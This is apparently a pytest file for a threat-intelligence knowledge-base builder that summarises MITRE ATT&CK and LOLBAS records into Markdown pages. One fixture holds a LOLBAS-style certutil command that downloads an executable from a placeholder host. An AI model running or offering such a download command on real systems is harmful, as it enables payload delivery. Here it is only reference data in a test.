from src.kb_builder.build_summary import (
    object_with_most_fields,
    render_datasource_field_summary,
    render_object_property_pages,
    summarize_records,
)
from src.kb_builder.models import KBObject
from src.kb_builder.paths import ProjectPaths


def test_summarize_records_tracks_nested_fields_and_samples():
    summary = summarize_records(
        [
            {
                "type": "attack-pattern",
                "name": "Security Account Manager",
                "external_references": [
                    {
                        "source_name": "mitre-attack",
                        "external_id": "T1003.002",
                    }
                ],
            },
                {
                    "type": "tool",
                    "name": "Mimikatz",
                    "_source_path": ".cache/example.yml",
                    "external_references": [
                    {
                        "source_name": "mitre-attack",
                        "external_id": "S0002",
                    }
                ],
            },
        ]
    )

    assert summary["type"].count == 2
    assert summary["name"].samples == ["Security Account Manager", "Mimikatz"]
    assert summary["external_references"].types == {"list"}
    assert summary["external_references[].external_id"].samples == ["T1003.002", "S0002"]
    assert "_source_path" not in summary


def test_render_datasource_field_summary_writes_build_file(tmp_path):
    paths = ProjectPaths(
        vault_path=tmp_path / "vault",
        cache_path=tmp_path / ".cache",
        log_path=tmp_path / ".logs",
    )

    result = render_datasource_field_summary(
        sources={
            "lolbas": [
                {
                    "Name": "Certutil.exe",
                    "Commands": [
                        {
                            "Command": "certutil.exe -urlcache -f http://example.test/a.exe a.exe",
                            "MitreID": "T1105",
                        }
                    ],
                }
            ]
        },
        marker="focuslocust",
        paths=paths,
    )

    assert result is True
    summary = (tmp_path / "vault/kb/_build/datasource-fields.md").read_text(encoding="utf-8")
    assert "parsed_by: focuslocust" in summary
    assert "## lolbas" in summary
    assert "`Commands[].MitreID`" in summary
    assert "T1105" in summary


def test_render_object_property_pages_writes_jinja_reference_page(tmp_path):
    paths = ProjectPaths(
        vault_path=tmp_path / "vault",
        cache_path=tmp_path / ".cache",
        log_path=tmp_path / ".logs",
    )
    obj = KBObject(
        id="certutil.exe",
        source="lolbas",
        type="tool",
        name="Certutil.exe",
        path="kb/lolbas/tools/certutil.exe.md",
        raw={
            "Name": "Certutil.exe",
            "Acknowledgement": [
                {"Person": "Matt Graeber", "Handle": "@mattifestation"},
            ],
        },
    )

    written, skipped = render_object_property_pages(
        objects_by_group={"lolbas/tools": [obj]},
        marker="focuslocust",
        paths=paths,
    )

    assert written == 1
    assert skipped == 0
    page = (tmp_path / "vault/kb/_build/objects/lolbas/tools/example-certutil.exe-certutil.exe.md").read_text(
        encoding="utf-8"
    )
    assert "parsed_by: focuslocust" in page
    assert "selected because it has the most raw datasource properties" in page
    assert "`Acknowledgement[].Handle`" in page
    assert 'field_values("Acknowledgement[].Handle")' in page
    assert "@mattifestation" in page


def test_object_with_most_fields_selects_richest_raw_object():
    sparse = KBObject(
        id="sparse",
        source="test",
        type="tool",
        name="Sparse",
        raw={"Name": "Sparse"},
    )
    rich = KBObject(
        id="rich",
        source="test",
        type="tool",
        name="Rich",
        raw={"Name": "Rich", "Commands": [{"Command": "run", "MitreID": "T1105"}]},
    )

    assert object_with_most_fields([sparse, rich]) is rich
